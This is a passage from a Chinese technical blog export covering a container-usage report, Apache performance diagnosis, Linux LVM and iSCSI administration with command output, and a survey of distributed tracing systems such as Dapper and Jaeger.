服务存活周期“服务的寿命是多少？” 在 Kubernetes 中, 服务抽象定义了一组提供特定函数以及如何访问它们的 Pods 。服务允许 Pods 在不影响应用程序的情况下注销和复制。例如, 一个群集可以运行一个 Node.js JavaScript 运行时服务、MySQL 数据库服务和 NGINX 前端服务。 我们看到大多数服务(67%)生存期超过一周。少量的服务在更频繁的基础上被停止, 但是对于大多数客户来说, 目标是让应用程序 24 小时持续工作。容器和 Pods 可能会来了又走, 但是服务持续处于启动并且可用状态。 容器编排器 First place goes to Kubernetes, followed by Kubernetes and then Kubernetes. 例如, Mesosphere 能够在 DC/OS 环境中部署和管理 “Kubernetes-as-a-service”。可以将多个 Kubernetes 群集部署在一个 Mesosphere 群集上。 今年 Docker Swarm 的排名上升到第二位, 超过了基于 Mesos 的工具。根据 Sysdig ServiceVision 我们能自动标识出是否使用编排器, 并将逻辑基础结构对象与容器度量关联起来。在 2018 年, Kubernetes 可以确保领先地位。 Swarm 的进入门槛例如, 微软使用 Kubernetes 为其 Azure Kubernetes 服务 (AKS), IBM 的云容器服务和私有云产品也是基于 Kubernetes 。即使是 Docker 和 Mesosphere 也增加支持了 Kubernetes 的功能。 Docker 企业版, 具有通用控制平面 (Universal Control Plane (UCP) ), 在许多操作层面上降低了启动 Swarm 的门槛。 容器集群大小 Mesos owns the big cluster game. ”集群大小对与组织选择编排器的影响是什么？“这项研究显示基于 Mesos 的编排器, 包括 Mesos Marathon 和 Mesosphere DC/OS 降至第三位。在使用 Mesos 的地方, 部署的容器数（中位数）比 Kubernetes 环境多 50% 。鉴于 Mesos 倾向于在大规模的容器和云部署, 所以这是有意义的。因此, 虽然 Mesos 集群的数量较少, 但是 Mesos 集群通常是意味着更大的企业规模。 我们的客户, 往往是更大的企业（在私有数据中心运行 Sysdig 解决方案）采用 OpenShift 的数量比我们的 SaaS 客户数量还要多。 Rancher Labs 于 2015 年出现, 为 Docker Swarm 和 Kubernetes 提供支持。直到 2017 年, Rancher （“大农场主”）才完全兼容 Kubernetes 作为其编排器。 Kubernetes 分发版今年我们分析了使用 Kubernetes 的“品牌”分布, 看看在使用的 Kubernetes 是开源版本, 或由特定供应商提供的软件包。我们发现开源 Kubernetes 继续占有最大的份额, 但是 OpenShift 似乎正在取得突破进展, Rancher 也占有了一些份额。 OpenShift 获得接受不应该是一个惊喜。Kubernetes 于 2014 年诞生于 Google , Red Hat 也发布了该平台的 OpenShift 分发版, 并提出了针对企业客户实现 Kubernetes 的目标。 容器健康与应用性能监控了解用户体验的四个“黄金信号” ：延迟（latency），流量（traffic），错误（errors）和饱和度（saturation）。响应时间（Response time）是配置最广泛的告警类型，紧随其后的是正常运行时间（uptime）和停机告警。基于主机的告警是最常用的，包括主要资源指标 - CPU ，内存和磁盘使用率等仍然被广泛使用。用户想知道托管 Docker 的服务器（物理机，虚拟机或云实例）是否处于资源紧张或达到容量上限的状态。这些告警的触发条件通常设置在利用率达到 80%-95％ 之间。 同时，出现了越来越多的以容器为中心的资源告警。最主要有两种风格： 1）资源利用率 2）容器数量 默认情况下容器没有资源限制 。鉴于客户越来越注意容器限制方面的告警，这意味着他们正在使用 Docker运行时配置来控制容器使用内存，CPU或磁盘I / O 的上限，用户希望知道何时会超出阈值，应用程序的性能风险需要处于可控状态。 对于容器数量来说，这个问题通常与用户至少需要 X 个给定类型的容器并运行以提供所需的服务级别有关，特别是在微服务部署中。例如，“我知道如果需要确保应用程序运行良好，至少有三个 NGINX 容器可用。如果任何一个有问题，我都想知道。” 基于编排的告警（Orchestration-focused alerts） 也越来越受欢迎。与我们 2017 年的报告类似，“Pod Restart Count” 位列榜首。在一个 Pod 中，一个或多个容器是定位相同、共同调度（通常作为微服务的一部分）。如果某个容器重新启动太频繁，则表示存在可能影响应用程序性能的问题。 Kubernetes 管理员也经常使用 基于事件的告警（ Event-based alerts ） 。与基于度量的告警相比，它的区别在于，监控程序需要查找环境中生成的事件消息，例如 Kurthnetes “CrashLoopBackoff” 条件 — 代表 Pod 反复失败或重启，或者“Liveness probe failed”，表示容器是否为活跃和运行。这些告警有助于 DevOps 工程师快速定位问题。 Http 错误可能表明软件或基础架构存在问题，最终会影响性能。 Alerts are not a one-size-fits-all approach. 告警不是一种万能的方法。有时需要设置基于指定范围的告警，无论是逻辑或物理实体，还是整个基础结构（注：Sysdig 通过标签实现）。 在 2018 年的研究中，用于确定告警范围的最常用标签与 Kubernetes 有关（Scoping by pods），命名空间（namespace）紧随其后。特定的容器范围（Container specific scoping）也很受欢迎，包括容器名称，容器镜像和容器 ID 。2018年再次名列榜首的是云服务提供商标签，通常针对“名称”，“环境”，“ID”和“区域”标签以区分开发、测试和生产资源，以及标记云数据中心的位置。 容器和基础设施自定义监控指标 There’s no one custom metrics format to rule them all. “在环境中运行容器的客户，使用自定义指标的比例是多少，都是哪些？” 55％ 的 Sysdig SaaS 用户使用与 Java 应用程序相关的 JMX 指标。这与我们看到的 Java 应用程序部署非常广泛的事实一致。 StatsD 占有 29％ 的份额，Prometheus 占有 20％ 的份额（预计这个数字会随着时间的推移而增长）。 容器注册 It’s a split decision - registries are critical but there’s no clear leader. 注册管理机构至关重要，但是目前没有明确的领导者。容器注册表（container registry）是任何容器部署的基本组件。市场上有许多解决方案：一些是公共的，一些是私有的，一些是作为服务提供，一些是作为本地软件（private registry）部署。 2018 年前三名中，Google Container Registry（GCR）的比例最高，其次是 Quay ,之后是 Docker和 Amazon Elastic Container Registry（ECR）。 GCR 和 ACR 都是完全基于云托管的（private Docker container registries）。Quay 和 Docker 既可以用作本地解决方案也可以在云中运行（注：Sysdig 的用户群只有 50％ 能够清楚地识别出容器注册方案） New approaches are maturing and helping organizations develop applications more quickly to solve real business challenges and compete in the digital marketplace. 扩展阅读网络安全专题合辑《Cyber-Security Manual》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 AgentNEO 架构简介 | 07 May 2018 用 Sysdig 监控服务器和 Docker 容器 | 曹元其 | 2016 年 7 月 15 日发布 使用 sysdig 进行监控和调试 linux 机器]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断：Web Server]]></title>
    <url>%2F2018%2F06%2F11%2FLinux-Perf-App%2F</url>
    <content type="text"><![CDATA[摘要Web Server 性能分析 Apache vs Nginx JVM vs Go 问题12#[Wed Jul 25 22:19:05 2018] [error] server reached MaxClients setting, consider raising the MaxClients setting 12345678910111213141516171819## 持续输出进程数$ watch "pgrep httpd | wc -l"Every 2.0s: pgrep httpd | wc -l Thu Jul 26 21:12:12 201842$ ps -ylC httpd --sort:rssS UID PID PPID C PRI NI RSS SZ WCHAN TTY TIME CMDS 501 37620 1 0 80 0 1268 11253 poll_s ? 00:14:17 httpdS 501 37622 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpdS 501 37623 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpdS 501 37624 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpdS 501 37625 37620 0 80 0 1708 11320 inet_c ? 00:00:00 httpd.....## 当前连接数$ netstat -an | grep :2003 | wc -l172# 累计消耗内存（M）$ ps aux|grep -v grep|awk '/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/1024&#125;'# 平均每个进程消耗内存（M）$ ps aux|grep -v grep|awk '/httpd/&#123;sum+=$6;n++&#125;;END&#123;print sum/n/1024&#125;' Apache Server MPM 问题：为什么 Apache HTTP Server 启动有多个进程 多处理模块(Multi -Processing Modules，MPM) 12345678$ ./httpd -VServer version: Apache/2.2.31 (Unix)......Architecture: 64-bitServer MPM: Prefork threaded: no forked: yes (variable process count)Server compiled with.... Prefork 工作模式 123456789//httpd.conf 默认配置&lt;IfModule prefork.c&gt; StartServers 8 # 服务初始化的工作进程数（work process）MinSpareServers 5 # 保持的最少空闲进程数MaxSpareServers 20 # 保持的最大空闲进程数ServerLimit 256 # 保持的最大活动进程数，设定MaxClients的上限值MaxClients 256 # 最大并发连接数MaxRequestsPerChild 4000 # 每个子进程在生命周期能服务的最大请求数,即控制每个进程在处理了多少次请求之后自动销毁&lt;/IfModule&gt; Worker 工作模式 123456789//httpd.conf 默认配置&lt;IfModule worker.c&gt;StartServers 4 # 初始化的子进程数MaxClients 300 # 并发请求最大数MinSpareThreads 25 # 最小空闲线程数total=所有进程的线程数加起来MaxSpareThreads 75 # 最大空闲线程数ThreadsPerChild 25 # 每个子进程可生成的线程数MaxRequestsPerChild 100 # 每个子进程可服务的最大请求数,0表示不限制,建议设置为非0&lt;/IfModule&gt; Event 工作模式 Apache vs. Nginx How to Monitor Nginx Performance Using Netdata on CentOS 7 JVM vs. Go App Go memory ballast: How I learned to stop worrying and love the heap 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 案例与实务 最佳工程实践：Stack Overflow 架构 - 2016 Edition 最佳工程实践：Oracle 数据库迁移割接实践 最佳工程实践：基于LVS的AAA负载均衡架构实践 VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer 参考文献 Java 应用性能调优实践 动态追踪技术-应用性能瓶颈排障利器之火焰图 Apache的三种MPM模式比较：prefork，worker，event Apache HTTP Server 中prefork和worker工作模式（二） Sites are very slow. Apache shows: server reached MaxClients setting on Plesk for Linux]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works:Device and FileSystem]]></title>
    <url>%2F2018%2F06%2F07%2FLinux-Works-FileSystem%2F</url>
    <content type="text"><![CDATA[摘要 BASIC Command LVM iSCSI 传统的计算机，其工作的原理都是冯·诺依曼体系：机器里面有一个很大的存储器，用来储存所有的信息，还有一个中央区域，执行简单的计算。我们从存储器的这个地方提取一个数据，又从存储器的另一个地方提取一个数据，把这两个数据送到中央算术单元进行相加，然后把计算结果传送到存储器的另一个地方。这样来看，计算机有一个高效运转的中央处理器，工作十分卖力，速度也很快。 相比之下，整个存储器从头到尾待在一旁，很清闲，就像是一个卡片档案柜，除了偶尔翻找几张卡片，档案柜大多数时间都闲置着。显然，如果有更多的处理器同时工作的话，我们的计算速度就能更快一些。问题是当你使用这个处理器时，可能要用到存储器的某个信息，而同时另一个处理器也需要这个信息，机器就会陷入一片混乱中。出于这些原因，大家普遍认为让很多处理器同时工作是个难题。 – 理查德·费曼. 发现的乐趣 (未读·探索家) (Kindle 位置 470-472). Command lsblk 12345678910NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 1000G 0 disk|-sda1 8:1 0 500M 0 part /boot|-sda2 8:2 0 19.5G 0 part| |-vg_nwtest68-lv_root (dm-0) 253:0 0 47.5G 0 lvm /| `-vg_nwtest68-lv_swap (dm-1) 253:1 0 2G 0 lvm [SWAP]`-sda3 8:3 0 980G 0 part |-vg_nwtest68-lv_root (dm-0) 253:0 0 47.5G 0 lvm / |-vg_nwtest68-lv_data (dm-2) 253:2 0 100G 0 lvm /datasr0 11:0 1 3.6G 0 rom /media/RHEL-6.8 Server.x86_64 fdisk The fdisk command below will print the partition table of all mounted block devices.&gt;&gt;&gt;&gt;&gt; More details &lt;&lt;&lt;&lt;&lt; 1234567891011121314151617181920212223242526272829303132333435363738$ sudo fdisk -l[root@NW-DD-APP ~]# fdisk -lDisk /dev/sda: 1073.7 GB, 1073741824000 bytes255 heads, 63 sectors/track, 130541 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x0008ca86 Device Boot Start End Blocks Id System/dev/sda1 * 1 64 512000 83 LinuxPartition 1 does not end on cylinder boundary./dev/sda2 64 2611 20458496 8e Linux LVM/dev/sda3 2611 130541 1027599062+ 83 LinuxDisk /dev/mapper/vg_nwtest68-lv_root: 51.0 GB, 51011125248 bytes255 heads, 63 sectors/track, 6201 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/vg_nwtest68-lv_swap: 2147 MB, 2147483648 bytes255 heads, 63 sectors/track, 261 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/vg_nwtest68-lv_data: 107.4 GB, 107374182400 bytes255 heads, 63 sectors/track, 13054 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000 sfdisk 1234567891011121314$ sudo sfdisk -lDisk /dev/sda: 130541 cylinders, 255 heads, 63 sectors/trackUnits = cylinders of 8225280 bytes, blocks of 1024 bytes, counting from 0 Device Boot Start End #cyls #blocks Id System/dev/sda1 * 0+ 63- 64- 512000 83 Linux/dev/sda2 63+ 2610- 2547- 20458496 8e Linux LVM/dev/sda3 2610+ 130540 127931- 1027599062+ 83 Linux/dev/sda4 0 - 0 0 0 EmptyDisk /dev/mapper/vg_nwtest68-lv_root: 6201 cylinders, 255 heads, 63 sectors/trackDisk /dev/mapper/vg_nwtest68-lv_swap: 261 cylinders, 255 heads, 63 sectors/trackDisk /dev/mapper/vg_nwtest68-lv_data: 13054 cylinders, 255 heads, 63 sectors/track cfdisk 12345678910111213cfdisk (util-linux-ng 2.17.2) Disk Drive: /dev/sdaSize: 1073741824000 bytes, 1073.7 GBHeads: 255 Sectors per Track: 63 Cylinders: 130541Name Flags Part Type FS Type [Label] Size (MB)-----------------------------------------------------------------------------------------------------------------------------------------------------------Pri/Log Free Space 1.05 *sda1 Boot Primary Linux ext3 524.29 *sda2 Primary Linux LVM 20949.50 *sda3 Primary Linux 1052261.44 *Pri/Log Free Space 5.55 * LVM1234567891011121314 -- create partitions on disk drives (type 8e in fdsik) -- create physical volumes from the partitions --&gt; $ sudo pvcreate /dev/sda1 -- create the volumes group --&gt; $ sudo vgcreate -s 16m vg /dev/sda1 -- allocate logical volumes from the volume group --&gt; $ sudo lvcreate -l 50g -n mylvm vg -- format the logical volumes --&gt; $ sudo mkfs -t ext4 /dev/vg/mylvm -- mount the logical volumes (also update /etc/fstab as needed) --&gt; $ mkdir /mylvm,then --&gt; $ sudo mount /dev/vg/mylvm /mylvm,then add --&gt; /dev/vg/mylvm /mylvm ext4 defaults 0 0 to the /etc/fstab 查看1234567891011121314151617181920cat /etc/fstabdf -T -h # 查看卷组信息vgdisplay# 查看逻辑卷信息lvdispaly# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 500G 0 disk├─sda1 8:1 0 500M 0 part /boot├─sda2 8:2 0 19.5G 0 part│ ├─vg_nwtest68-lv_root (dm-0) 253:0 0 35G 0 lvm /│ └─vg_nwtest68-lv_swap (dm-1) 253:1 0 2G 0 lvm [SWAP]├─sda3 8:3 0 20G 0 part│ └─vg_nwtest68-lv_root (dm-0) 253:0 0 35G 0 lvm /└─sda4 8:4 0 10G 0 part 卸载12345umount /home# 删除逻辑卷，注意：检查目录是否为空lvremove /dev/mapper/VolGroup-lv_home 创建1234567891011121314151617181920#在卷组 (name:VolGroup) 上创建逻辑卷lvcreate -L 375GB -n lv_slview VolGroup # 格式化新建的逻辑卷mkfs.ext4 /dev/mapper/VolGroup-lv_slview# 创建挂载点mkdir /slview# 挂载mount /dev/mapper/VolGroup/lv_slview /slview# 修改 fstab 重启后自动挂载（风险点）vi /etc/fstab# reboot# fstab 异常处理mount -o remount rw /. 扩容12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182fdisk -l# df -khFilesystem Size Used Avail Use% Mounted on/dev/mapper/VolGroup-lv_root 35G 23G 9.9G 70% /tmpfs 932M 208K 932M 1% /dev/shm/dev/sda1 477M 41M 411M 10% /boot/dev/mapper/VolGroup-lv_oradata1 2.5G 3.8M 2.4G 1% /oradata1# pvs PV VG Fmt Attr PSize PFree /dev/sda2 VolGroup lvm2 a--u 19.51g 0 /dev/sda3 VolGroup lvm2 a--u 19.99g 0# pvcreate /dev/sda4 Physical volume "/dev/sda4" successfully created# pvs PV VG Fmt Attr PSize PFree/dev/sda2 VolGroup lvm2 a--u 19.51g 0/dev/sda3 VolGroup lvm2 a--u 19.99g 0/dev/sda4 lvm2 ---- 10.00g 10.00g# vgdisplay --- Volume group --- VG Name VolGroup ...... Act PV 2 VG Size 39.50 GiB PE Size 4.00 MiB Total PE 10112 Alloc PE / Size 10112 / 39.50 GiB Free PE / Size 0 / 0 # vgextend VolGroup /dev/sda4 Volume group "VolGroup" successfully extended# vgdisplay --- Volume group --- VG Name VolGroup ...... Act PV 3 VG Size 49.50 GiB PE Size 4.00 MiB Total PE 12672 Alloc PE / Size 10112 / 39.50 GiB Free PE / Size 2560 / 10.00 GiB# lvextend -L +10GB /dev/mapper/VolGroup-lv_oradata1Size of logical volume VolGroup/lv_oradata1 changed from 2.50 GiB (640 extents) to 12.50 GiB (3200 extents). Logical volume lv_oradata1 successfully resized.# vgdisplay --- Volume group --- VG Name VolGroup ...... Act PV 3 VG Size 49.50 GiB PE Size 4.00 MiB Total PE 12672 Alloc PE / Size 12672 / 49.50 GiB Free PE / Size 0 / 0 # resize2fs /dev/mapper/VolGroup-lv_oradata1resize2fs 1.41.12 (17-May-2010)Filesystem at /dev/mapper/VolGroup-lv_oradata1 is mounted on /oradata1;on-line resizing requiredold desc_blocks = 1, new_desc_blocks = 1Performing an on-line resize of /dev/mapper/vg_nwtest68-lv_oradata1 to 3276800 (4k) blocks.The filesystem on /dev/mapper/vg_nwtest68-lv_oradata1 is now 3276800 blocks long.# df -khFilesystem Size Used Avail Use% Mounted on/dev/mapper/VolGroup-lv_root 35G 23G 9.9G 70% /tmpfs 932M 288K 932M 1% /dev/shm/dev/sda1 477M 41M 411M 10% /boot/dev/mapper/VolGroup-lv_oradata1 13G 6.3M 12G 1% /oradata1 移除 How to remove missing PV from VG 1234# vgreduce --removemissing datavg WARNING: Device for PV fPFkBx-lbnG-R6Zo-3kq5-KOLA-U1ou-LdNIMD not found or rejected by a filter. Couldn\'t find device with uuid fPFkBx-lbnG-R6Zo-3kq5-KOLA-U1ou-LdNIMD. Wrote out consistent volume group datavg. TipsSCSI小型计算机系统接口（SCSI，Small Computer System Interface）是一种用于计算机及其周边设备之间（硬盘、软驱、光驱、打印机、扫描仪等）系统级接口的独立处理器标准。最大部分的应用是在存储设备上（例如硬盘、磁带机）。 iSCSI（Internet Small Computer System Interface，发音为/ˈаɪskʌzi/），Internet小型计算机系统接口，又称为IP-SAN，是一种基于因特网及SCSI-3协议下的存储技术，由IETF提出，并于2003年2月11日成为正式的标准。 123456789# iqnvi /etc/iscsi/initiatorname.iscsi# 查找iSCSI目标$ iscsiadm -m discovery -t st -p &lt;组IP地址&gt;:3260# 登录$ iscsiadm -m node -T &lt;完整的目标名称,iqn.xxxxxx&gt; -l -p &lt;组IP&gt;:3260# 注销$ iscsiadm -m node -u -T &lt;完整的目标名称&gt;-p &lt;组IP地址&gt;:3260 异常处理1234567891011# df -F ufs -o iFilesystem iused ifree %iused Mounted on/dev/dsk/c0t0d0s0 190397 6443139 3% //dev/dsk/c0t0d0s4 457204 165964 73% /var/dev/dsk/c0t1d0s3 43539 6461869 1% /slview/dev/dsk/c0t0d0s3 19745 1226591 2% /oracle# find /var/spool/clientmqueue/ -exec ls &#123;&#125; + |awk '&#123;print $1&#125;' | wc -l 866350# find /var/spool/clientmqueue/ -exec ls &#123;&#125; + |awk '&#123;print $1&#125;' | wc -l^C# getconf ARG_MAX1048320 Projects go-fastdfs | 一个简单的分布式文件存储，具有高性能，高可靠，免维护等优点，支持断点续传，分块上传，小文件合并，自动同步，自动修复 Fast directory traversal for Golang IPFS The Interplanetary File System | Simply Explained 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 10 Useful Commands to Collect System and Hardware Information in Linux An introduction to Linux’s EXT4 filesystem How to Increase the size of a Linux LVM by adding a new disk Unable to add physical volume ‘/dev/hda’ to volume group Linux LVM硬盘管理及LVM扩容 创建和挂载 Oracle Solaris 文件系统 iSCSI存储技术全攻略|2007 exFAT 文件系统指南 Virtual filesystems in Linux: Why we need them and how they work IPFS The Interplanetary File System | Simply Explained]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：分布式追踪系统体系概要]]></title>
    <url>%2F2018%2F05%2F18%2FDevOps-OpenTracing%2F</url>
    <content type="text"><![CDATA[摘要 Key Words: metrics、logging、tracing Google Dapper Family : Uber Jaeger、淘宝 EagleEye、微博 Watchman、京东 CallGraph、美团 MTrace 数据可视化 | Exporters This article is part of an Distributed Tracing and Monitoring System tutorial series. Make sure to check out my other articles as well: DevOps 漫谈：分布式追踪系统体系概要 DevOps 漫谈：开源分布式跟踪系统 OpenCensus 绪论讨论分布式追踪技术，首先需要明确的是：什么是跟踪 ？ metrics度量（metrics）的特征是聚合: 它们是在一段时间内组成单一逻辑标尺、计数器或直方图的跨度。例如：HTTP 请求的数量可以建模为计数器(counter）, 其更新逻辑很简单，只需通过加法聚合; 如果设定一段持续的观察时间，请求数可以被建模成一个直方图。《基于Ganglia实现服务集群性能态势感知》 介绍的就是以记录度量为主的故障监控系统。 logging日志（logging）的特征是处理离散事件。按照事件发生的源可以分为 Application Events、System Events、Service Events、DNS Events 等。通常也包含针对原始记录的处理过程，例如：通过 Syslog 将应用程序调试或错误消息发送到 Elasticsearch ; 审计记录通过 Kafka 将数据推送到类似 BigTable 的数据池; 从服务调用中提取特定的请求元数据, 并发送错误跟踪服务（例如 NewRelic）。 tracing跟踪（tracing）的特征：跟踪处理的是请求范围内的信息（request-scoped），例如 SQL 语句在数据库的实际执行时间或 HTTP 请求耗时。以 DTrace &amp; SystemTap 为代表的 动态追踪技术 基于操作系统内核，不需要埋点就可以提供高级性能分析和调试功能。但是在分布式架构场景中也有一些不足，例如某些功能需要多次调用 RPC 远程服务，这些服务分布在多台不同的 host/vm/docker 中，如果需要测量该功能响应的完整持续时间就有难度。 示例（Use OpenCensus with OpenZipkin）OpenCensus 作为埋点 API ，导出 tracing data 到 OpenZipkin，由 Zipkin 的 Web UI 提供数据展示和交互能力，可以很清晰地看到函数调用顺序和耗时。从理解系统行为的角度上说，与动态追踪技术中的火焰图（flame graph）有异曲同工之妙。 串行调用函数方法，包括网络访问和持久化操作 示例（OpenCensus with OpenZipkin）：并行调用函数方法（Go routine） Google Dapper Family讨论分布式跟踪，就一定会谈到 Dapper —— Google 公司研发并应用于自己生产环境的一款跟踪系统（设计之初参考了一些 Magpie 和 X-Trace 的理念 ）。Dapper 不仅为业内提供了非常有参考价值的实现，同步发表论文的也成为了当前分布式跟踪系统的重要理论基础。Google Dapper 的理念影响了一批分布式跟踪系统的发展，例如 2012 年，Twitter 公司严格按照 Dapper 论文的要求实现了 Zipkin （Scala 编写，集成到 Twitter 公司自己的分布式服务 Finagle ）；Uber 公司基于 Google Dapper 和 Twitter Zipkin 的灵感，开发了开源分布式跟踪系统 Jaeger。 《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》 OpenTracing 通过提供平台无关、厂商无关的API，使得开发人员能够方便的添加（或更换）追踪系统的实现。 OpenTracing 提供了用于运营支撑系统的和针对特定平台的辅助程序库。除了 API 之外，一个完整的分布式追踪系统还需要包括数据存储、支持代理转发、用户友好的 WebUI 等特性，例如：Zipkin 专注于 tracing 领域；Prometheus 开始专注于 metrics，同时可能会发展更多的 tracing 功能，但不太可能深入 logging 领域；基于 ELK 之类的日志系统专注于 logging 领域，但也可能集成其他领域的特性。总之，各式各样的分布式追踪系统都是以 tracing 为基础，同时根据自己的需要在其他两个领域各有所侧重而已。 Uber JaegerUber Jaeger 是 Uber 工程团队开源的分布式追踪系统。自 2016年 起，Jaeger 在 Uber 内部实现大范围应用。Uber 同时开发了一种适用于 RPC 的网络多路复用和框架协议 —— TChannel | Support: Node.js,Python,Go,Java，该协议融入了分布式追踪能力。 TChannel 协议规范在二进制格式中直接定义了追踪字段：“ spanid:8 parentid:8 traceid:8 traceflags:1 ”。 jaeger-client：支持多种语言的客户端库，如Go, Java, Python等语言 jaeger-agent：客户端代理负责将追踪数据转发到服务端，这样能方便应用的快速处理，同时减轻服务端的直接压力；另外可以在客户端代理动态调整采样的频率，进行追踪数据采样的控制 jaeger-collector：数据收集器主要进行数据收集和处理，从客户端代理收集数据进行处理后持久化到数据存储中 数据存储：目前支持将收集到的数据持久化到 Cassandra 、 Elasticsearch jaeger-query：主要根据不同的条件到数据存储中进行搜索，支撑前端页面的展示 jaeger-ui：一个基于 React 的前端 webui jaeger spark: 是一个基于 Spark 聚合数据管道，用以完成服务依赖分析 淘宝 EagleEye（鹰眼）EagleEye（鹰眼） 是Google 的分布式调用跟踪系统 Dapper 在淘宝的实现。主要特点是通过每台应用机器上的 Agent 实时抓取 EagleEye 日志，按照日志类型不分别处理： 全量原始日志直接存储到 HDFS ；创建 MapReduce 任务完成调用链合并、分析和统计； 有实时标记的原始日志存储到 HBase ； 业务日志：一部分会被直接处理存储到 HBase，有一部分会作为消息发送出去，由特定的业务系统订阅处理； 调用实时统计，提供分钟级别的实时链路调用视图，辅助故障定位。 国内其他衍生系统 微博 Watchman：微博平台的链路追踪及服务质量保障系统。watchman-aspect 组件通过异步日志（async-logger）在各个节点上输出日志文件；以流式的方式处理数据，watchman-prism 组件（基于 Scribe），将日志推送到 watchman-stream 组件（基于Storm）, 根据需求进行聚合、统计等计算（针对性能数据），规范化、排序（针对调用链数据），之后写入 HBase 。 京东 CallGraph：全局 TraceID 的调用链。核心包（完成埋点逻辑，日志存放在内存磁盘上由 Agent 收集发送到JMQ）、JMQ（日志数据管道）、Storm（对数据日志并行整理和计算）、存储（实时数据存储JimDB/HBase/ES，离线数据存储包括HDFS和Spark）、CallGraph-UI（用户交互界面）、UCC（存放配置信息并同步到各服务器）、管理元数据（存放链路签名与应用映射关系等）。日志格式：固定部分（TraceID、RpcID、开始时间、调用类型、对端IP、调用耗时、调用结果等）、可变部分。 美团 MTrace：美团点评内部的分布式会话跟踪系统。基于全局 TraceID 的调用链，客户端与后端服务之间有一层 Kafka，实现两边工程的解耦。实时数据主要使用 Hbase ，traceID 作为 RowKey；离线数据主要使用 Hive，可以通过 SQL 进行一些结构化数据的定制分析。 CN105224445B | WO2017071134A1 | 分布式追踪系统| 北京汇商融通信息技术有限公司 | 2015-10-28 不完全统计 名称 原理 客户端 依赖分析 存储 可视化 Google Dapper TraceID —– —– —– —– OpenTracing TraceID go,java,python,js,objective-c,c++ —– —– —– OpenCensus TraceID go,java,python,C++,.Net,js,Erlang —– —– no web-ui,Support Exporter Uber Jaeger TraceID java,go,python Support Agent Proxy Spark Cassandra、ES React Web-ui 淘宝 EagleEye（鹰眼） TraceID yes MapReduce HDFS(全量) HBase(实时) yes 微博 Watchman 日志 